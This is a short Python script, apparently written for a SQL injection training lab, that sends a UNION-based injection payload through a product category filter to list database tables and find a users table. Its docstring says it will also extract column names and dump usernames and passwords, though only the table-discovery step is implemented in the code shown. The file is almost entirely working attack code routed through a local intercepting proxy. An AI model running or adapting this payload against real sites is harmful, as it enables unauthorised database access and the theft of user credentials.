'''
This script will perform steps 4-6 in notes.txt
    -Output list of table names in the database
    -Output column names from the selected table
    -Output usernames and password from column
'''
import requests 
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



#=========================================
#Function is used for sending the different payloads for the script
#essentially all payloads will be sent via this function
#=========================================
def perform_request(url, sqli_payload):
    path = 'filter?category=Pets'
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    return r.text

#=========================================
#Output list of table names in the database
#=========================================
def sqli_users_table(url):
    path = 'filter?category=Pets'
    payload = "%27%20union%20select%20table_name,%20null%20from%20information_schema.tables--"
    res = perform_request(url, payload)    
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False






if __name__== '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('Looking for users table...')
    users_table = sqli_users_table(url)
    if users_table:
        print( f'Found the users table name: {users_table}')
    else:
        print('Did not find users table :(')